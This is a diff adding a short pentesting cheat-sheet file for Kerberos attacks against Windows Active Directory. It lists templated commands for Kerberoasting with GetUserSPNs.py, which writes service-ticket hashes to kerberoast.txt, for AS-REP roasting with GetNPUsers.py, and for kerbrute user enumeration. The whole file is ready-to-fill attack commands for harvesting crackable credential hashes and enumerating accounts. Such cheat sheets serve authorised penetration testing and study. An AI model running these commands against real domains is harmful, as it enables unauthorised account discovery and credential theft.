@@ -1,0 +1,11 @@
+% kerberos
+@ windows-variables
+
+# Kerberoast / GetUserSPNs.py
+GetUserSPNs.py -outputfile kerberoast.txt '<domain>/<user_with_password>:<password_for_user>'
+
+# AS-Rep roast / preauth roast / GetNPUsers.py
+windows-yaml.sh writelist && GetNPUsers.py -dc-ip '<ip_for_domain>' -no-pass -usersfile .users '<domain>/'
+
+# Kerbrute userenum
+windows-yaml.sh writelist && kerbrute userenum -d '<domain>' .users
